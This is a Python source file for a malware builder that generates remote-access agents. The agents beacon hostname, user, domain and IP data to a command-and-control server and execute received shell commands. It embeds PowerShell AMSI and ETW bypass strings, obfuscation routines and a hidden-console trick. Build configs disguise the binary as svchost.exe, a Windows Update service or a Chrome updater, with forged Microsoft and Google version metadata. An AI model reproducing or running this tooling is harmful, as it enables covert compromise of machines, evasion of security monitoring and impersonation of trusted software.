"""
Advanced Agent Generator with Compilation and Disguise Options
Supports multiple output formats, signature evasion, and legitimate binary mimicking
"""

import os
import json
import random
import string
import hashlib
import subprocess
import base64
from datetime import datetime
from typing import Dict, List, Any, Optional

class AdvancedAgentGenerator:
    """Enhanced agent generator with compilation and disguise capabilities"""
    
    def __init__(self):
        self.templates = {}
        self.compilation_configs = {}
        self.load_templates()
        self.load_compilation_configs()
        
    def load_templates(self):
        """Load agent templates for different scenarios"""
        self.templates = {
            "basic_agent": '''
import socket
import subprocess
import threading
import time
import base64
import json
import os
import sys
from datetime import datetime

class Agent:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
        self.socket = None
        self.running = True
        self.agent_id = self.generate_agent_id()
        
    def generate_agent_id(self):
        """Generate unique agent ID"""
        import hashlib
        unique_data = f"{os.environ.get('COMPUTERNAME', 'unknown')}{os.environ.get('USERNAME', 'unknown')}{time.time()}"
        return hashlib.md5(unique_data.encode()).hexdigest()[:8]
    
    def connect(self):
        """Connect to C2 server"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.server_ip, self.server_port))
            
            # Send initial beacon
            beacon_data = {
                "id": self.agent_id,
                "hostname": os.environ.get('COMPUTERNAME', 'unknown'),
                "user": os.environ.get('USERNAME', 'unknown'),
                "domain": os.environ.get('USERDOMAIN', 'WORKGROUP'),
                "external_ip": self.get_external_ip(),
                "internal_ip": self.get_internal_ip(),
                "process": os.path.basename(sys.executable),
                "pid": os.getpid(),
                "arch": "x64" if sys.maxsize > 2**32 else "x86",
                "last_seen": datetime.now().isoformat()
            }
            
            self.send_data(beacon_data)
            return True
            
        except Exception as e:
            return False
    
    def get_external_ip(self):
        """Get external IP address"""
        try:
            import urllib.request
            response = urllib.request.urlopen('https://api.ipify.org', timeout=5)
            return response.read().decode('utf-8')
        except:
            return "Unknown"
    
    def get_internal_ip(self):
        """Get internal IP address"""
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "Unknown"
    
    def send_data(self, data):
        """Send data to server"""
        try:
            json_data = json.dumps(data)
            self.socket.send(json_data.encode() + b'\\n')
        except:
            pass
    
    def execute_command(self, command):
        """Execute system command"""
        try:
            result = subprocess.run(command, shell=True, capture_output=True, 
                                  text=True, timeout=30)
            return {
                "output": result.stdout,
                "error": result.stderr,
                "returncode": result.returncode
            }
        except subprocess.TimeoutExpired:
            return {"error": "Command timed out", "returncode": -1}
        except Exception as e:
            return {"error": str(e), "returncode": -1}
    
    def listen(self):
        """Listen for commands from server"""
        while self.running:
            try:
                data = self.socket.recv(4096).decode()
                if not data:
                    break
                    
                try:
                    command_data = json.loads(data.strip())
                    command = command_data.get('command', '')
                    
                    if command == 'exit':
                        self.running = False
                        break
                    elif command.startswith('shell'):
                        cmd = command[6:]  # Remove 'shell ' prefix
                        result = self.execute_command(cmd)
                        self.send_data({
                            "agent_id": self.agent_id,
                            "type": "command_result",
                            "command": cmd,
                            "result": result
                        })
                    
                except json.JSONDecodeError:
                    pass
                    
            except:
                break
        
        if self.socket:
            self.socket.close()

def main():
    server_ip = "{server_ip}"
    server_port = {server_port}
    
    agent = Agent(server_ip, server_port)
    
    # Connection retry loop
    max_retries = 5
    retry_count = 0
    
    while retry_count < max_retries:
        if agent.connect():
            agent.listen()
            break
        else:
            retry_count += 1
            time.sleep(random.randint(5, 15))

if __name__ == "__main__":
    main()
            ''',
            
            "stealth_agent": '''
import socket
import subprocess
import threading
import time
import base64
import json
import os
import sys
import random
from datetime import datetime

# {amsi_bypass}

# {etw_bypass}

class StealthAgent:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
        self.socket = None
        self.running = True
        self.agent_id = self.generate_agent_id()
        self.jitter = random.uniform(0.8, 1.2)
        
    def generate_agent_id(self):
        """Generate unique agent ID with obfuscation"""
        import hashlib
        unique_data = f"{os.environ.get('COMPUTERNAME', 'unknown')}{os.environ.get('USERNAME', 'unknown')}{time.time()}"
        return hashlib.sha256(unique_data.encode()).hexdigest()[:12]
    
    def obfuscated_sleep(self, duration):
        """Sleep with jitter to avoid detection"""
        actual_duration = duration * self.jitter
        time.sleep(actual_duration)
    
    def stealth_connect(self):
        """Stealthy connection with retry logic"""
        connection_attempts = 0
        max_attempts = 10
        
        while connection_attempts < max_attempts and self.running:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.settimeout(30)
                
                # Connect with random delay
                self.obfuscated_sleep(random.uniform(1, 5))
                self.socket.connect((self.server_ip, self.server_port))
                
                # Send obfuscated beacon
                beacon_data = self.create_obfuscated_beacon()
                self.send_encrypted_data(beacon_data)
                
                return True
                
            except Exception as e:
                connection_attempts += 1
                self.obfuscated_sleep(random.uniform(30, 120))
                if self.socket:
                    try:
                        self.socket.close()
                    except:
                        pass
                
        return False
    
    def create_obfuscated_beacon(self):
        """Create obfuscated beacon data"""
        beacon_data = {
            "id": self.agent_id,
            "hostname": self.obfuscate_string(os.environ.get('COMPUTERNAME', 'unknown')),
            "user": self.obfuscate_string(os.environ.get('USERNAME', 'unknown')),
            "domain": self.obfuscate_string(os.environ.get('USERDOMAIN', 'WORKGROUP')),
            "external_ip": self.get_external_ip_stealth(),
            "internal_ip": self.get_internal_ip(),
            "process": self.obfuscate_string(os.path.basename(sys.executable)),
            "pid": os.getpid() ^ 0x1234,
            "arch": "x64" if sys.maxsize > 2**32 else "x86",
            "last_seen": datetime.now().isoformat(),
            "capabilities": ["shell", "download", "upload", "persist"]
        }
        return beacon_data
    
    def obfuscate_string(self, text):
        """Simple string obfuscation"""
        if not text:
            return text
        return base64.b64encode(text.encode()).decode()
    
    def get_external_ip_stealth(self):
        """Get external IP with multiple fallbacks"""
        ip_services = [
            'https://api.ipify.org',
            'https://ipecho.net/plain', 
            'https://icanhazip.com',
            'https://ident.me'
        ]
        
        for service in ip_services:
            try:
                import urllib.request
                req = urllib.request.Request(service)
                req.add_header('User-Agent', self.get_random_user_agent())
                response = urllib.request.urlopen(req, timeout=10)
                return response.read().decode('utf-8').strip()
            except:
                continue
        
        return "Unknown"
    
    def get_random_user_agent(self):
        """Get random user agent for stealth"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        ]
        return random.choice(user_agents)
    
    def get_internal_ip(self):
        """Get internal IP address"""
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "Unknown"
    
    def send_encrypted_data(self, data):
        """Send encrypted data to server"""
        try:
            json_data = json.dumps(data)
            encrypted_data = self.xor_encrypt(json_data, 0x42)
            encoded_data = base64.b64encode(encrypted_data).decode()
            self.socket.send((encoded_data + '\\n').encode())
        except:
            pass
    
    def xor_encrypt(self, data, key):
        """Simple XOR encryption"""
        return bytes([ord(c) ^ key for c in data])

def main():
    server_ip = "{server_ip}"
    server_port = {server_port}
    
    agent = StealthAgent(server_ip, server_port)
    
    while True:
        if agent.stealth_connect():
            break
        agent.obfuscated_sleep(random.uniform(60, 300))

if __name__ == "__main__":
    try:
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
    
    main()
            '''
        }
    
    def load_compilation_configs(self):
        """Load compilation configurations for different disguises"""
        self.compilation_configs = {
            "update_exe": {
                "name": "update.exe",
                "description": "Windows Update Service",
                "icon": "system_update.ico",
                "version_info": {
                    "CompanyName": "Microsoft Corporation",
                    "FileDescription": "Windows Update Service",
                    "FileVersion": "10.0.19041.1266",
                    "InternalName": "update.exe",
                    "LegalCopyright": "© Microsoft Corporation. All rights reserved.",
                    "OriginalFilename": "update.exe",
                    "ProductName": "Microsoft® Windows® Operating System",
                    "ProductVersion": "10.0.19041.1266"
                }
            },
            "svchost_exe": {
                "name": "svchost.exe",
                "description": "Host Process for Windows Services",
                "icon": "system_service.ico",
                "version_info": {
                    "CompanyName": "Microsoft Corporation",
                    "FileDescription": "Host Process for Windows Services",
                    "FileVersion": "10.0.19041.1266",
                    "ProductName": "Microsoft® Windows® Operating System"
                }
            },
            "chrome_update": {
                "name": "ChromeUpdate.exe",
                "description": "Google Chrome Update Service",
                "icon": "chrome.ico",
                "version_info": {
                    "CompanyName": "Google LLC",
                    "FileDescription": "Google Chrome Update Service",
                    "FileVersion": "98.0.4758.102",
                    "ProductName": "Google Chrome"
                }
            }
        }
    
    def generate_advanced_agent(self, server_ip: str, server_port: int, 
                              agent_type: str = "stealth_agent", 
                              compilation_option: str = "update_exe",
                              obfuscation_level: int = 3) -> Dict[str, Any]:
        """Generate advanced agent with specified options"""
        
        if agent_type not in self.templates:
            raise ValueError(f"Unknown agent type: {agent_type}")
        
        if compilation_option not in self.compilation_configs:
            raise ValueError(f"Unknown compilation option: {compilation_option}")
        
        template = self.templates[agent_type]
        config = self.compilation_configs[compilation_option]
        
        # Apply AMSI and ETW bypasses for stealth agents
        amsi_bypass = ""
        etw_bypass = ""
        
        if agent_type == "stealth_agent":
            amsi_bypass = '''
# AMSI Bypass
$a=[Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$x = @(0);[System.Runtime.InteropServices.Marshal]::Copy($x, 0, $ptr, 1)
            '''
            etw_bypass = '''
# ETW Bypass  
[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
            '''
        
        # Format template
        agent_code = template.format(
            server_ip=server_ip,
            server_port=server_port,
            amsi_bypass=amsi_bypass,
            etw_bypass=etw_bypass
        )
        
        # Apply obfuscation
        if obfuscation_level > 0:
            agent_code = self._apply_code_obfuscation(agent_code, obfuscation_level)
        
        result = {
            "agent_code": agent_code,
            "compilation_config": config,
            "filename": config["name"],
            "build_files": self._generate_build_files(config, agent_code),
            "compilation_command": self._generate_compilation_command(config)
        }
        
        return result
    
    def _apply_code_obfuscation(self, code: str, level: int) -> str:
        """Apply code obfuscation techniques"""
        
        if level >= 1:
            code = self._obfuscate_variable_names(code)
        
        if level >= 2:
            code = self._obfuscate_strings(code)
        
        if level >= 3:
            code = self._obfuscate_control_flow(code)
        
        return code
    
    def _obfuscate_variable_names(self, code: str) -> str:
        """Obfuscate variable names"""
        replacements = {
            "agent": f"_{random.randint(1000, 9999)}",
            "server_ip": f"_{random.randint(1000, 9999)}",
            "server_port": f"_{random.randint(1000, 9999)}",
            "socket": f"_{random.randint(1000, 9999)}"
        }
        
        for old, new in replacements.items():
            code = code.replace(old, new)
        
        return code
    
    def _obfuscate_strings(self, code: str) -> str:
        """Obfuscate string literals"""
        import re
        
        def encode_string(match):
            string_content = match.group(1)
            if len(string_content) > 5:
                encoded = base64.b64encode(string_content.encode()).decode()
                return f'base64.b64decode("{encoded}").decode()'
            return match.group(0)
        
        code = re.sub(r'"([^"]{6,})"', encode_string, code)
        return code
    
    def _obfuscate_control_flow(self, code: str) -> str:
        """Add control flow obfuscation"""
        obfuscated_code = f"""
import random
_dummy = random.randint(1, 100)
if _dummy > 0:
    pass

{code}

for _i in range(random.randint(1, 3)):
    if _i == 999:
        exit()
        """
        
        return obfuscated_code
    
    def _generate_build_files(self, config: Dict[str, Any], agent_code: str) -> Dict[str, str]:
        """Generate build files for compilation"""
        
        files = {}
        
        # Generate version info file
        version_info = f'''
VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=({config['version_info']['FileVersion'].replace('.', ', ')}),
    prodvers=({config['version_info']['FileVersion'].replace('.', ', ')}),
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
  ),
  kids=[
    StringFileInfo([
      StringTable(
        u'040904B0',
        [StringStruct(u'CompanyName', u'{config['version_info']['CompanyName']}'),
        StringStruct(u'FileDescription', u'{config['version_info']['FileDescription']}'),
        StringStruct(u'FileVersion', u'{config['version_info']['FileVersion']}'),
        StringStruct(u'ProductName', u'{config['version_info']['ProductName']}')])
    ]), 
    VarFileInfo([VarStruct(u'Translation', [1033, 1200])])
  ]
)
'''
        files["version_info.txt"] = version_info
        files["agent.py"] = agent_code
        
        # Build script
        build_script = f'''
@echo off
echo Building {config['name']}...
pip install pyinstaller
pyinstaller --onefile --noconsole --version-file=version_info.txt --name={config['name'].replace('.exe', '')} agent.py
copy dist\\{config['name'].replace('.exe', '')}.exe {config['name']}
echo Build complete: {config['name']}
pause
'''
        files["build.bat"] = build_script
        
        return files
    
    def _generate_compilation_command(self, config: Dict[str, Any]) -> str:
        """Generate PyInstaller compilation command"""
        
        cmd_parts = [
            "pyinstaller",
            "--onefile",
            "--noconsole", 
            f"--version-file=version_info.txt",
            f"--name={config['name'].replace('.exe', '')}",
            "agent.py"
        ]
        
        return " ".join(cmd_parts)
    
    def get_compilation_options(self) -> Dict[str, Dict[str, Any]]:
        """Get all available compilation options"""
        return self.compilation_configs

def generate_undetectable_agent(host, port, agent_type="basic"):
    """Legacy function for compatibility"""
    generator = AdvancedAgentGenerator()
    result = generator.generate_advanced_agent(host, port, "basic_agent", "update_exe", 1)
    return result["agent_code"]

# Global instance
advanced_agent_generator = AdvancedAgentGenerator()
